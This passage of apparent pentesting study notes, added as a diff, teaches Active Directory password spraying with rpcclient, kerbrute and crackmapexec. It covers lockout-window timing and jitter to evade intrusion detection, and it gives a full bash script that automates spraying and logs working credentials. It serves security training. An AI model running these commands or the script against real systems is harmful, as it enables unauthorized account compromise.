@@ -996,3 +996,212 @@ Get-AdUser -Filter * -Property SamAccountName | Select-Object SamAccountName
 - This requires domain-joined credentials but offers detailed information, including additional properties if needed.
 
 ---
+
+### Performing a Password Spraying Attack Internally Using Linux
+
+Once we have successfully enumerated usernames and gathered information about the domain's password policy (such as minimum password length, reset account lockout counter (observation window) and account lockout threshold), we can use this information to perform a password spraying attack. Remember, this type of attack tries a single common password against many accounts rather than attacking one account with many passwords, making it effective while reducing the risk of account lockouts.
+
+>[!IMPORTANT]
+>The *observation window* is how long - usually in minutes - windows tracks failed login attempts when counting up to the account lockout threshold | if the number of failed password attempts for an account reaches the account lockout threshold within the observation window the account will be locked
+
+>[!TIP]
+>The *observation window* is essentialy the same as the *reset account lockout counter* we - hopefully - enumerated during our work finding the *password policy* | if we did not find it we could err on the side of caution and take it to be 60 minutes | either that or just ask the organization we are pentesting for - they might let us know it...
+
+#### Key Considerations for Password Spraying
+- **Understand the Lockout Policy**: Before starting, confirm the account lockout threshold (e.g., after how many failed attempts an account is locked) and the observation window (e.g., the time before the counter is reset).
+- **Use a Delay Between Sprays**: Implement a delay between password spray attempts to avoid triggering account lockouts - use what we know from the above point about the lockout policy.
+- **Spray with Common Passwords That Meet Complexity Rules**: Use passwords that follow complexity requirements but are still weak (e.g., “Winter2024!”).
+- **Monitor for Detection**: If possible, use tools like `kerbrute` to spray stealthily and avoid creating too much noise on the network.
+
+### Example: Password Spraying Using `rpcclient`
+`rpcclient` can be used to perform a quick password spray against SMB services on a Windows domain controller. Below is a bash one-liner that reads usernames from a file (`userlist.txt`) and attempts a single password against each one.
+
+```bash
+for u in $(cat targets.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
+```
+
+>[!NOTE]
+>This approach works best for quick validation of a single password against many accounts
+
+![ad41](/images/41.png)
+
+### Example: Password Spraying Using `kerbrute`
+`kerbrute` can be used for password spraying against Kerberos. It creates fewer logs and does not generate Windows Event ID 4625 for failed login attempts. It can also handle large username lists efficiently.
+
+>[!NOTE]
+>We have not found a flag yet which stops kerbrute from stopping its `passwordspray` after finding the first success - this is annoying but of course a workaround could be found via scripts
+
+```bash
+kerbrute passwordspray -d EXAMPLE.COM --dc <DC-IP> userlist.txt Winter2024!
+```
+
+#### Explanation:
+- **`passwordspray`**: Runs the password spray module in `kerbrute`.
+- **`-d example.com`**: Specifies the target domain.
+- **`--dc <DC-IP>`**: Points `kerbrute` to the domain controller's IP address.
+- **`userlist.txt`**: Provides the list of usernames.
+- **`Winter2024!`**: Specifies the password to be sprayed.
+
+![ad49](/images/49.png)
+
+### Example: Password Spraying Using `crackmapexec`
+`crackmapexec` is a powerful tool for spraying credentials across SMB services and is highly versatile for both internal and external network attacks.
+
+```bash
+sudo crackmapexec --jitter 10 smb 172.16.5.5 -u userlist.txt -p Winter2024! --continue | grep +
+```
+
+#### Explanation:
+- **`--jitter 10`**: Specifies the maximum time in seconds a random delay known as jitter could be - this is to attempt to bypass *Intrusion Detection Systems*
+- **`smb <TARGET-IP>`**: Specifies the target IP address (can also use `smb <SUBNET>` to target a range).
+- **`-u userlist.txt`**: Provides the list of usernames to spray.
+- **`-p Winter2024!`**: Specifies the single password to be tested.
+- **`--continue`**: Continues spraying even if some accounts authenticate successfully.
+
+![ad39](/images/39.png)
+
+![ad48](/images/48.png)
+
+#### Validation
+
+We can validate the credentials are correct using `sudo crackmapexec smb 172.16.5.5 -u sgage -p Welcome1`
+
+![ad40](/images/40.png)
+
+### Responsible Password Spraying
+Responsible password spraying involves taking precautions to avoid detection and reduce the chance of locking accounts:
+
+1. **Check the Password Policy First**: Before spraying, we want to know the exact lockout threshold and observation window. This information will help set an appropriate interval between attempts.
+   
+2. **Set the `--jitter` Option in `crackmapexec`**: Using the `--jitter` option slows down our spraying attempts, making it less likely that we will hit the lockout threshold - as it is a random value it also helps to bypass *IDS*.
+
+3. **Use Safe Passwords**: Choose initial passwords that are likely to succeed without locking out accounts (e.g., default passwords like `CompanyName123`).
+
+4. **Pause Between Sprays**: Add a time delay between each password spraying cycle, typically a few minutes, to allow the lockout counters to reset.
+
+This ensures that each account has time to reset its counter if our attempts are unsuccessful, keeping our attack below the lockout threshold.
+
+Yes, the **observation window** in password spraying is the same as the **"Reset account lockout counter after"** setting found in the domains password policy.
+
+### Responsible Password Spraying Example in Practice
+Let us say during our enumeration we discover the following password policy:
+
+- **Account Lockout Threshold**: 3 failed attempts.
+- **Reset Account Lockout Counter After**: 60 minutes.
+- **Account Lockout Duration**: 15 minutes.
+
+In this scenario:
+
+- The **observation window** is 60 minutes. If we have 3 failed attempts within these 30 minutes, the account is locked - bad juju :face_palm: 
+- After 60 minutes pass without 3 consecutive failed attempts, the counter resets to 0, and we can safely retry without triggering a lockout - good juju :smiling_imp: 
+
+In short, we need to tailor our attacks to the context of the domain password policy of the organization we are targetting.
+
+### Example bash script for Automated Password Spraying
+
+When pentesting time is of the essence - we need to be working on other areas of our testing whilst our password spraying attacks are running - this makes it useful to know how we can use *bash* to automate them.
+
+Here we will look at a simple bash script that automates a password spraying attack using a given list of usernames and passwords. This script uses `rpcclient` to perform the spraying, includes a delay between each password attempt to avoid lockouts, and saves the successful logins to a separate file.
+
+### Prerequisites
+1. Create a file named `userlist.txt` containing usernames (one username per line).
+2. Create a file named `passwordlist.txt` containing the passwords to spray (one password per line).
+
+### Bash Script: `password_spray.sh`
+```bash!
+#!/bin/bash
+
+# Input files
+target_ip="<TARGET-IP>"         # Replace with the IP of the target system
+userlist="userlist.txt"
+passwordlist="passwordlist.txt"
+delay=1800                      # Set delay between sprays (e.g., 1800 seconds = 30 minutes)
+output_file="successful_attempts.txt"  # File to store successful logins
+
+# Ensure the output file exists and is empty at the start
+> $output_file
+
+# Check if both user and password list files exist
+if [[ ! -f $userlist ]] || [[ ! -f $passwordlist ]]; then
+  echo "Userlist or Passwordlist file not found!"
+  exit 1
+fi
+
+# Loop through each password in the password list
+while IFS= read -r password; do
+  echo "Spraying password: $password"
+  
+  # Loop through each user in the user list for the current password
+  while IFS= read -r username; do
+    echo "Trying $password for user: $username"
+
+    # Use rpcclient for SMB-based password spraying, suppress output except for successful attempts
+    # This can be changed if other tools are required such as crackmapexec or ldapsearch
+    rpcclient -U "$username%$password" $target_ip -c exit &>/dev/null
+    
+    # If the previous command was successful, log the successful attempt
+    if [[ $? -eq 0 ]]; then
+      echo "[+] Successful login - Username: $username | Password: $password"
+      echo "$username:$password" >> $output_file
+    fi
+
+    # Short delay between individual user attempts to avoid triggering detection mechanisms
+    sleep 5  
+  done < "$userlist"
+
+  # Wait for the observation window before trying the next password
+  echo "Waiting for observation window to pass to avoid lockout..."
+  sleep $delay
+
+done < "$passwordlist"
+```
+
+### Script Explanation:
+- **Variables Defined at the Top**:
+  - `target_ip`: IP address of the target domain controller.
+  - `userlist`: File containing usernames to spray (e.g., `userlist.txt`).
+  - `passwordlist`: File containing passwords to try (e.g., `passwordlist.txt`).
+  - `delay`: Time (in seconds) to wait between password attempts (set to 30 minutes as a default).
+  - `output_file`: File to store successful login attempts.
+  
+- **Command Execution**:
+  - Loops through each password in `passwordlist.txt` and runs an `rpcclient` spray attempt against all usernames in `userlist.txt`.
+  - If a successful login is found it is saved to the `successful_attempts.txt` file.
+  - Pauses for a specified time - the default is 5 seconds - before trying the next username to reduce load on the server
+
+- **Delay Between Sprays**:
+  - After each password is tried, the script waits for a delay period (`sleep "$delay"`) to avoid triggering account lockouts.
+
+### Example Usage:
+1. Save the above script to a file named `password_spray.sh`.
+2. Give execution permissions:
+
+   ```bash
+   chmod +x password_spray.sh
+   ```
+
+3. Run the script:
+
+   ```bash
+   ./password_spray.sh
+   ```
+
+![ad44](/images/44.png)
+
+![ad45](/images/45.png)
+
+![ad46](/images/46.png)
+
+![ad47](/images/47.png)
+
+### Things to Consider:
+- **Account Lockout Policy**: Adjust the delay (`delay=1800`) as necessary, based on our understanding of the domain's account lockout policy.
+- **Output Analysis**: The script saves the output to `successful_attempts.txt`, making it easier to track which passwords successfully authenticated.
+
+### Potential Customization:
+- Use a different tool for the actual password spray.
+- Modify the delay time based on the lockout policy.
+- Adjust the script to include other options, such as targeting specific hosts in a subnet.
+- Add multi-threading or parallel execution if necessary, though this should be used cautiously to avoid noise.
+
+[This script](/scripts/password_spray.sh) provides a straightforward way to automate internal password spraying attacks with responsible delays built in to minimize account lockouts.
